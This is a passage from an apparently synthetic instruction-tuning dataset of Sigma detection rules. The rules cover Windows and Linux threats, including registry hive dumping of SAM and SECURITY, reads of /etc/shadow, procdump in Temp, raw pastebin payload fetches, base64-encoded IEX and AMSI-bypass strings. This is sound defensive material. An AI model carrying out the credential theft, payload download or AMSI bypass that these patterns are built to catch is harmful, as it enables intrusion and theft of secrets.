      "answer": "In order to detect signs of the WMI script host process \"scrcons.exe\" loading scripting DLLs which could indicate WMI ActiveScriptEventConsumers EventConsumers activity, you should monitor Windows image load events for instances where the \"scrcons.exe\" is involved alongside the loading of specific scripting Dynamic Link Libraries (DLLs). These libraries include 'vbscript.dll', 'wbemdisp.dll', 'wshom.ocx', and 'scrrun.dll'. The presence of these activities may signal the malicious use of Windows Management Instrumentation (WMI) for executing scripts, a technique often utilized by attackers for persistence, lateral movement, or information gathering. It is important to note that there may be legitimate uses of these DLLs, and certain devices, such as Dell computers, might trigger these alerts under normal operations, like adjusting screen brightness via the keyboard. The alert level for these findings is classified as medium, indicating a need for investigations to ascertain the nature of these events further."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious file creation patterns found in logs when CrackMapExec is used.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious file creation patterns found in logs when CrackMapExec is used, you should: monitor Windows file event logs for indications of potentially malicious activity involving file creation that resembles the tactics used by attackers leveraging CrackMapExec. Key things to look out for include files being created in the `C:\\Windows\\Temp\\` directory that are initiated by the process `C:\\WINDOWS\\system32\\rundll32.exe`. Additionally, be vigilant for file creations by users with names that contain variations of 'AUTHORI' or 'AUTORI', indicating administrative rights might be in use. The types of files to be especially cautious about include a wide range of extensions such as `.rtf`, `.otf`, `.odt`, `.txt`, `.doc`, `.pdf`, `.dll`, `.docx`, `.wpd`, `.icns`, `.db`, `.ini`, `.tex`, `.sys`, `.csv`, `.fon`, `.tar`, `.ttf`, `.xml`, `.cfg`, `.cpl`, `.jpg`, `.drv`, `.cur`, and `.tmp`. Another specific file to watch for is `C:\\Windows\\Temp\\procdump.exe`, which is a tool often misused for dumping process memory, indicating a high likelihood of malicious activity. Alerting on these indicators should be considered high priority due to their potential association with malicious activities, though be aware of possible false positives due to unknown factors.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_lsass_dump1:\n        TargetFilename|startswith: 'C:\\Windows\\Temp\\'\n        Image: 'C:\\WINDOWS\\system32\\rundll32.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        TargetFilename|endswith:\n            - '.rtf'\n            - '.otf'\n            - '.odt'\n            - '.txt'\n            - '.doc'\n            - '.pdf'\n            - '.dll'\n            - '.docx'\n            - '.wpd'\n            - '.icns'\n            - '.db'\n            - '.ini'\n            - '.tex'\n            - '.sys'\n            - '.csv'\n            - '.fon'\n            - '.tar'\n            - '.ttf'\n            - '.xml'\n            - '.cfg'\n            - '.cpl'\n            - '.jpg'\n            - '.drv'\n            - '.cur'\n            - '.tmp'\n            # list is incomplete\n    selection_procdump:\n        TargetFilename: 'C:\\Windows\\Temp\\procdump.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_lsass_dump1:\n        TargetFilename|startswith: 'C:\\Windows\\Temp\\'\n        Image: 'C:\\WINDOWS\\system32\\rundll32.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n        TargetFilename|endswith:\n            - '.rtf'\n            - '.otf'\n            - '.odt'\n            - '.txt'\n            - '.doc'\n            - '.pdf'\n            - '.dll'\n            - '.docx'\n            - '.wpd'\n            - '.icns'\n            - '.db'\n            - '.ini'\n            - '.tex'\n            - '.sys'\n            - '.csv'\n            - '.fon'\n            - '.tar'\n            - '.ttf'\n            - '.xml'\n            - '.cfg'\n            - '.cpl'\n            - '.jpg'\n            - '.drv'\n            - '.cur'\n            - '.tmp'\n            # list is incomplete\n    selection_procdump:\n        TargetFilename: 'C:\\Windows\\Temp\\procdump.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious file creation patterns found in logs when CrackMapExec is used",
      "answer": "In order to detect suspicious file creation patterns found in logs when CrackMapExec is used, you should: monitor Windows file event logs for indications of potentially malicious activity involving file creation that resembles the tactics used by attackers leveraging CrackMapExec. Key things to look out for include files being created in the `C:\\Windows\\Temp\\` directory that are initiated by the process `C:\\WINDOWS\\system32\\rundll32.exe`. Additionally, be vigilant for file creations by users with names that contain variations of 'AUTHORI' or 'AUTORI', indicating administrative rights might be in use. The types of files to be especially cautious about include a wide range of extensions such as `.rtf`, `.otf`, `.odt`, `.txt`, `.doc`, `.pdf`, `.dll`, `.docx`, `.wpd`, `.icns`, `.db`, `.ini`, `.tex`, `.sys`, `.csv`, `.fon`, `.tar`, `.ttf`, `.xml`, `.cfg`, `.cpl`, `.jpg`, `.drv`, `.cur`, and `.tmp`. Another specific file to watch for is `C:\\Windows\\Temp\\procdump.exe`, which is a tool often misused for dumping process memory, indicating a high likelihood of malicious activity. Alerting on these indicators should be considered high priority due to their potential association with malicious activities, though be aware of possible false positives due to unknown factors."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form, you should: Monitor proxy logs for any URLs that contain certain keywords associated with popular pastebin services. Specifically, look for accesses to URLs that include '.paste.ee/r/', '.pastebin.com/raw/', '.hastebin.com/raw/', '.ghostbin.co/paste/*/raw/', 'pastetext.net/', 'pastebin.pl/', and 'paste.ee/'. These are common platforms where malicious code might be hosted, especially in its raw form which is often used in the delivery of malware during attack campaigns. Logs should record the Client IP address, the full requested URI (c-uri), and the client user agent string (c-useragent). It's important to recognize that there can be legitimate uses of these services, such as developers sharing code snippets, which might generate false positives. The severity level of this rule is set to high due to the potential risk associated with downloading and executing malicious code.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains:\n            - '.paste.ee/r/'\n            - '.pastebin.com/raw/'\n            - '.hastebin.com/raw/'\n            - '.ghostbin.co/paste/*/raw/'\n            - 'pastetext.net/'\n            - 'pastebin.pl/'\n            - 'paste.ee/'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy & paste)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains:\n            - '.paste.ee/r/'\n            - '.pastebin.com/raw/'\n            - '.hastebin.com/raw/'\n            - '.ghostbin.co/paste/*/raw/'\n            - 'pastetext.net/'\n            - 'pastebin.pl/'\n            - 'paste.ee/'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy & paste)\nlevel: high\n",
      "question": "direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form",
      "answer": "In order to detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form, you should: Monitor proxy logs for any URLs that contain certain keywords associated with popular pastebin services. Specifically, look for accesses to URLs that include '.paste.ee/r/', '.pastebin.com/raw/', '.hastebin.com/raw/', '.ghostbin.co/paste/*/raw/', 'pastetext.net/', 'pastebin.pl/', and 'paste.ee/'. These are common platforms where malicious code might be hosted, especially in its raw form which is often used in the delivery of malware during attack campaigns. Logs should record the Client IP address, the full requested URI (c-uri), and the client user agent string (c-useragent). It's important to recognize that there can be legitimate uses of these services, such as developers sharing code snippets, which might generate false positives. The severity level of this rule is set to high due to the potential risk associated with downloading and executing malicious code."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM and SECURITY.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM, and SECURITY, you should look for processes being created on Windows systems where the process image ends with '\\reg.exe' or the original file name is identified as 'reg.exe'. This focuses on detecting commands that involve saving or exporting information, specifically when these commands contain flags like 'save', 'export', or variations thereof that may attempt to evade detection by slightly altering the characters. Furthermore, attention is paid to commands targeting critical registry hive keys such as HKLM (HKEY_LOCAL_MACHINE) or any obfuscated variations of this term. The detection extends to specifics about which registry hives are being targeted for dumping, including SYSTEM, SAM, and SECURITY, along with any attempts to obfuscate these terms within the command line. It's also important to consider that there could be legitimate reasons for such activities, including backups or forensic investigations, which might be considered as false positives in such detection efforts. The detection level for these activities is set to high due to their potential impact on system security.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_cli_flag:\n        CommandLine|contains:\n            - 'save'\n            - 'export'\n            - '\u02e2ave'\n            - 'e\u02e3port'\n    selection_cli_hklm:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hk\u02eam'\n            - 'hkey_local_machine'\n            - 'hkey_\u02eaocal_machine'\n            - 'hkey_loca\u02ea_machine'\n            - 'hkey_\u02eaoca\u02ea_machine'\n    selection_cli_hive:\n        CommandLine|contains:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n            - '\\\u02e2ystem'\n            - '\\sy\u02e2tem'\n            - '\\\u02e2y\u02e2tem'\n            - '\\\u02e2am'\n            - '\\\u02e2ecurity'\n    condition: all of selection_*\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_cli_flag:\n        CommandLine|contains:\n            - 'save'\n            - 'export'\n            - '\u02e2ave'\n            - 'e\u02e3port'\n    selection_cli_hklm:\n        CommandLine|contains:\n            - 'hklm'\n            - 'hk\u02eam'\n            - 'hkey_local_machine'\n            - 'hkey_\u02eaocal_machine'\n            - 'hkey_loca\u02ea_machine'\n            - 'hkey_\u02eaoca\u02ea_machine'\n    selection_cli_hive:\n        CommandLine|contains:\n            - '\\system'\n            - '\\sam'\n            - '\\security'\n            - '\\\u02e2ystem'\n            - '\\sy\u02e2tem'\n            - '\\\u02e2y\u02e2tem'\n            - '\\\u02e2am'\n            - '\\\u02e2ecurity'\n    condition: all of selection_*\nfalsepositives:\n    - Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nlevel: high\n",
      "question": "usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM and SECURITY",
      "answer": "In order to detect the usage of \"reg.exe\" in order to dump sensitive registry hives, which includes SAM, SYSTEM, and SECURITY, you should look for processes being created on Windows systems where the process image ends with '\\reg.exe' or the original file name is identified as 'reg.exe'. This focuses on detecting commands that involve saving or exporting information, specifically when these commands contain flags like 'save', 'export', or variations thereof that may attempt to evade detection by slightly altering the characters. Furthermore, attention is paid to commands targeting critical registry hive keys such as HKLM (HKEY_LOCAL_MACHINE) or any obfuscated variations of this term. The detection extends to specifics about which registry hives are being targeted for dumping, including SYSTEM, SAM, and SECURITY, along with any attempts to obfuscate these terms within the command line. It's also important to consider that there could be legitimate reasons for such activities, including backups or forensic investigations, which might be considered as false positives in such detection efforts. The detection level for these activities is set to high due to their potential impact on system security."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Alert on when a user has performed an eDiscovery search or exported a PST file from the search. This PST file usually has sensitive information including email body content.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to alert on when a user has performed an eDiscovery search or exported a PST file from the search, which usually contains sensitive information including email body content, you should focus on monitoring activities within the Microsoft 365 Threat Management service, specifically those logged by the SecurityComplianceCenter. The activity to be aware of is when an event named 'eDiscovery search started or exported' occurs, with a status of success. This means that an eDiscovery search was successfully initiated or the results were exported, possibly into a PST file. Such activities must be carefully monitored because, while exporting PST files can be a part of regular operations, it involves access to sensitive content, and thus, should always be scrutinized to ensure it aligns with legitimate purposes. The level of concern for these types of activities is considered medium, implying they should not be ignored but also recognized that they can occur as part of normal business operations. Monitoring these activities helps in identifying potentially unauthorized or malicious actions aimed at accessing or exporting sensitive data, which is associated with tactics and techniques like Data Exfiltration and Collection in cybersecurity frameworks such as MITRE ATT&CK.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    service: threat_management\n    product: m365\n    definition: Requires the 'eDiscovery search or exported' alert to be enabled\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'eDiscovery search started or exported'\n        status: success\n    condition: selection\nfalsepositives:\n    - PST export can be done for legitimate purposes but due to the sensitive nature of its content it must be monitored.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    service: threat_management\n    product: m365\n    definition: Requires the 'eDiscovery search or exported' alert to be enabled\ndetection:\n    selection:\n        eventSource: SecurityComplianceCenter\n        eventName: 'eDiscovery search started or exported'\n        status: success\n    condition: selection\nfalsepositives:\n    - PST export can be done for legitimate purposes but due to the sensitive nature of its content it must be monitored.\nlevel: medium\n",
      "question": "Alert on when a user has performed an eDiscovery search or exported a PST file from the search. This PST file usually has sensitive information including email body content",
      "answer": "In order to alert on when a user has performed an eDiscovery search or exported a PST file from the search, which usually contains sensitive information including email body content, you should focus on monitoring activities within the Microsoft 365 Threat Management service, specifically those logged by the SecurityComplianceCenter. The activity to be aware of is when an event named 'eDiscovery search started or exported' occurs, with a status of success. This means that an eDiscovery search was successfully initiated or the results were exported, possibly into a PST file. Such activities must be carefully monitored because, while exporting PST files can be a part of regular operations, it involves access to sensitive content, and thus, should always be scrutinized to ensure it aligns with legitimate purposes. The level of concern for these types of activities is considered medium, implying they should not be ignored but also recognized that they can occur as part of normal business operations. Monitoring these activities helps in identifying potentially unauthorized or malicious actions aimed at accessing or exporting sensitive data, which is associated with tactics and techniques like Data Exfiltration and Collection in cybersecurity frameworks such as MITRE ATT&CK."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting enumeration of local systeam accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect enumeration of local system accounts, which can assist adversaries in identifying existing local accounts on a system for subsequent malicious activities, you should: Focus on monitoring process creations on Linux systems for specific command executions and utility usage that could indicate account enumeration attempts. Specifically, look out for the execution of the 'lastlog' command, which is often used in the enumeration of last login times for users, a critical piece of information for attackers. Additionally, be alert for commands containing 'x:0:' which might be used in attempts to identify root accounts or similarly privileged accounts. Pay particular attention to the usage of utilities like 'cat', 'head', 'tail', and 'more' when they are used in conjunction with attempts to access '/etc/passwd', '/etc/shadow', or '/etc/sudoers'. These files contain sensitive account information, and unauthorized access to them is a strong indicator of adversarial behavior. Monitoring for the use of 'id', a command used to get information about the current user or other users, and 'lsof' with the '-u' option, which lists files opened by users, can also be indicators of unauthorized enumeration activities. Beware that there might be false positives, primarily due to legitimate administration activities. Therefore, the level of concern for these activities is considered low until further suspicious activities are identified.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_1:\n        Image|endswith: '/lastlog'\n    selection_2:\n        CommandLine|contains: '''x:0:'''\n    selection_3:\n        Image|endswith:\n            - '/cat'\n            - '/head'\n            - '/tail'\n            - '/more'\n        CommandLine|contains:\n            - '/etc/passwd'\n            - '/etc/shadow'\n            - '/etc/sudoers'\n    selection_4:\n        Image|endswith: '/id'\n    selection_5:\n        Image|endswith: '/lsof'\n        CommandLine|contains: '-u'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_1:\n        Image|endswith: '/lastlog'\n    selection_2:\n        CommandLine|contains: '''x:0:'''\n    selection_3:\n        Image|endswith:\n            - '/cat'\n            - '/head'\n            - '/tail'\n            - '/more'\n        CommandLine|contains:\n            - '/etc/passwd'\n            - '/etc/shadow'\n            - '/etc/sudoers'\n    selection_4:\n        Image|endswith: '/id'\n    selection_5:\n        Image|endswith: '/lsof'\n        CommandLine|contains: '-u'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: low\n",
      "question": "enumeration of local systeam accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.",
      "answer": "In order to detect enumeration of local system accounts, which can assist adversaries in identifying existing local accounts on a system for subsequent malicious activities, you should: Focus on monitoring process creations on Linux systems for specific command executions and utility usage that could indicate account enumeration attempts. Specifically, look out for the execution of the 'lastlog' command, which is often used in the enumeration of last login times for users, a critical piece of information for attackers. Additionally, be alert for commands containing 'x:0:' which might be used in attempts to identify root accounts or similarly privileged accounts. Pay particular attention to the usage of utilities like 'cat', 'head', 'tail', and 'more' when they are used in conjunction with attempts to access '/etc/passwd', '/etc/shadow', or '/etc/sudoers'. These files contain sensitive account information, and unauthorized access to them is a strong indicator of adversarial behavior. Monitoring for the use of 'id', a command used to get information about the current user or other users, and 'lsof' with the '-u' option, which lists files opened by users, can also be indicators of unauthorized enumeration activities. Beware that there might be false positives, primarily due to legitimate administration activities. Therefore, the level of concern for these activities is considered low until further suspicious activities are identified."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of a base64 encoded \"IEX\" cmdlet in a process command line.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of a base64 encoded \"IEX\" cmdlet in a process command line, you should focus on observing the creation of processes on Windows systems. Specifically, look for indications of the \"Invoke-Expression\" cmdlet, commonly abbreviated as \"IEX\", being used within the command line of a newly created process. This cmdlet can be a strong indicator of an attack when it appears in its plain text form (e.g., \"IEX\", \"iex\") or in base64 encoded format, which may be used by attackers to obfuscate malicious scripts. \n\nThe detection strategy involves monitoring for specific patterns in the command line that suggest the presence of the \"IEX\" cmdlet. These patterns include various combinations of the cmdlet, such as \"IEX ([\", \"iex ([\", \"iex (New\", \"IEX (New\", and so on, along with their base64 encoded equivalents like 'SQBFAFgAIAAoAFsA', 'kAZQB4ACAAKABbA', etc. Identifying these command line strings is crucial because it can signify an attempt to execute PowerShell code dynamically, which is a common technique used by attackers for executing malicious scripts or commands.\n\nIt is important to pay attention to these signs as they may indicate an attempt to bypass security measures by obfuscating malicious commands, making it harder for traditional security tools to detect and block the attack. The detection of such patterns should be treated with a high level of suspicion and investigated promptly due to the significant potential for malicious activity associated with these indicators.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|base64offset|contains:\n            - 'IEX (['\n            - 'iex (['\n            - 'iex (New'\n            - 'IEX (New'\n            - 'IEX(['\n            - 'iex(['\n            - 'iex(New'\n            - 'IEX(New'\n            - \"IEX(('\"\n            - \"iex(('\"\n        # UTF16 LE\n        - CommandLine|contains:\n            - 'SQBFAFgAIAAoAFsA'\n            - 'kARQBYACAAKABbA'\n            - 'JAEUAWAAgACgAWw'\n            - 'aQBlAHgAIAAoAFsA'\n            - 'kAZQB4ACAAKABbA'\n            - 'pAGUAeAAgACgAWw'\n            - 'aQBlAHgAIAAoAE4AZQB3A'\n            - 'kAZQB4ACAAKABOAGUAdw'\n            - 'pAGUAeAAgACgATgBlAHcA'\n            - 'SQBFAFgAIAAoAE4AZQB3A'\n            - 'kARQBYACAAKABOAGUAdw'\n            - 'JAEUAWAAgACgATgBlAHcA'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|base64offset|contains:\n            - 'IEX (['\n            - 'iex (['\n            - 'iex (New'\n            - 'IEX (New'\n            - 'IEX(['\n            - 'iex(['\n            - 'iex(New'\n            - 'IEX(New'\n            - \"IEX(('\"\n            - \"iex(('\"\n        # UTF16 LE\n        - CommandLine|contains:\n            - 'SQBFAFgAIAAoAFsA'\n            - 'kARQBYACAAKABbA'\n            - 'JAEUAWAAgACgAWw'\n            - 'aQBlAHgAIAAoAFsA'\n            - 'kAZQB4ACAAKABbA'\n            - 'pAGUAeAAgACgAWw'\n            - 'aQBlAHgAIAAoAE4AZQB3A'\n            - 'kAZQB4ACAAKABOAGUAdw'\n            - 'pAGUAeAAgACgATgBlAHcA'\n            - 'SQBFAFgAIAAoAE4AZQB3A'\n            - 'kARQBYACAAKABOAGUAdw'\n            - 'JAEUAWAAgACgATgBlAHcA'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of a base64 encoded \"IEX\" cmdlet in a process command line",
      "answer": "In order to detect the usage of a base64 encoded \"IEX\" cmdlet in a process command line, you should focus on observing the creation of processes on Windows systems. Specifically, look for indications of the \"Invoke-Expression\" cmdlet, commonly abbreviated as \"IEX\", being used within the command line of a newly created process. This cmdlet can be a strong indicator of an attack when it appears in its plain text form (e.g., \"IEX\", \"iex\") or in base64 encoded format, which may be used by attackers to obfuscate malicious scripts. \n\nThe detection strategy involves monitoring for specific patterns in the command line that suggest the presence of the \"IEX\" cmdlet. These patterns include various combinations of the cmdlet, such as \"IEX ([\", \"iex ([\", \"iex (New\", \"IEX (New\", and so on, along with their base64 encoded equivalents like 'SQBFAFgAIAAoAFsA', 'kAZQB4ACAAKABbA', etc. Identifying these command line strings is crucial because it can signify an attempt to execute PowerShell code dynamically, which is a common technique used by attackers for executing malicious scripts or commands.\n\nIt is important to pay attention to these signs as they may indicate an attempt to bypass security measures by obfuscating malicious commands, making it harder for traditional security tools to detect and block the attack. The detection of such patterns should be treated with a high level of suspicion and investigated promptly due to the significant potential for malicious activity associated with these indicators."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Winword starting an uncommon subprocess FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262, you should: monitor process creation events on Windows systems for instances where the parent process is 'WINWORD.EXE' and it initiates a subprocess named 'FLTLDR.exe'. Be aware that there could be several false positives, especially from suspicious file names or locations such as temporary folders. This detection process is associated with a medium level of importance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WINWORD.EXE'\n        Image|contains: '\\FLTLDR.exe'\n    condition: selection\nfalsepositives:\n    - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\WINWORD.EXE'\n        Image|contains: '\\FLTLDR.exe'\n    condition: selection\nfalsepositives:\n    - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders)\nlevel: medium\n",
      "question": "Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262",
      "answer": "In order to detect Winword starting an uncommon subprocess FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262, you should: monitor process creation events on Windows systems for instances where the parent process is 'WINWORD.EXE' and it initiates a subprocess named 'FLTLDR.exe'. Be aware that there could be several false positives, especially from suspicious file names or locations such as temporary folders. This detection process is associated with a medium level of importance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of Xwizard tool with specific arguments which utilized to run custom class properties..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of Xwizard tool with specific arguments which utilized to run custom class properties, you should: monitor process creation events on Windows systems for occurrences where the process image name ends with '\\xwizard.exe'. Additionally, scrutinize the command line arguments of these processes for patterns that match a specific regular expression, which looks for a pattern resembling a GUID ('{8-4-4-4-12}' format where each number indicates the number of hexadecimal characters). This approach is aimed at identifying invocations of the Xwizard utility that might be leveraging uncommon or potentially malicious class properties, thereby signaling an unusual or suspicious activity that warrants further investigation. It's important to note that while this method is useful for identifying certain patterns of potentially malicious activity, it should also be acknowledged that there might be legitimate uses of the xwizard tool that could generate false positives. Therefore, the risk level associated with this detection strategy is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\xwizard.exe'\n        CommandLine|re: '\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\xwizard.exe'\n        CommandLine|re: '\\{[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}\\}'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of Xwizard tool with specific arguments which utilized to run custom class properties.",
      "answer": "In order to detect the execution of Xwizard tool with specific arguments which utilized to run custom class properties, you should: monitor process creation events on Windows systems for occurrences where the process image name ends with '\\xwizard.exe'. Additionally, scrutinize the command line arguments of these processes for patterns that match a specific regular expression, which looks for a pattern resembling a GUID ('{8-4-4-4-12}' format where each number indicates the number of hexadecimal characters). This approach is aimed at identifying invocations of the Xwizard utility that might be leveraging uncommon or potentially malicious class properties, thereby signaling an unusual or suspicious activity that warrants further investigation. It's important to note that while this method is useful for identifying certain patterns of potentially malicious activity, it should also be acknowledged that there might be legitimate uses of the xwizard tool that could generate false positives. Therefore, the risk level associated with this detection strategy is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect requests to \"amsiInitFailed\" that can be used to disable AMSI scanning, you should monitor for specific command-line activity within your Windows environment's process creation logs. Focus on detecting command lines containing either the 'System.Management.Automation.AmsiUtils' or 'amsiInitFailed' strings as one potential indicator. Another strong sign is command lines containing all the following strings: '[Ref].Assembly.GetType', 'SetValue($null,$true)', and 'NonPublic,Static'. Any one of these patterns matching is considered a high-level alert with an unlikely chance of being a false positive. This detection strategy helps in identifying attempts to bypass the Antimalware Scan Interface (AMSI) which is crucial for the proactive defense against malware and script-based attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'System.Management.Automation.AmsiUtils'\n            - 'amsiInitFailed'\n    selection_2:\n        CommandLine|contains|all:\n            - '[Ref].Assembly.GetType'\n            - 'SetValue($null,$true)'\n            - 'NonPublic,Static'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'System.Management.Automation.AmsiUtils'\n            - 'amsiInitFailed'\n    selection_2:\n        CommandLine|contains|all:\n            - '[Ref].Assembly.GetType'\n            - 'SetValue($null,$true)'\n            - 'NonPublic,Static'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning",
      "answer": "In order to detect requests to \"amsiInitFailed\" that can be used to disable AMSI scanning, you should monitor for specific command-line activity within your Windows environment's process creation logs. Focus on detecting command lines containing either the 'System.Management.Automation.AmsiUtils' or 'amsiInitFailed' strings as one potential indicator. Another strong sign is command lines containing all the following strings: '[Ref].Assembly.GetType', 'SetValue($null,$true)', and 'NonPublic,Static'. Any one of these patterns matching is considered a high-level alert with an unlikely chance of being a false positive. This detection strategy helps in identifying attempts to bypass the Antimalware Scan Interface (AMSI) which is crucial for the proactive defense against malware and script-based attacks."
    }
  },
  {
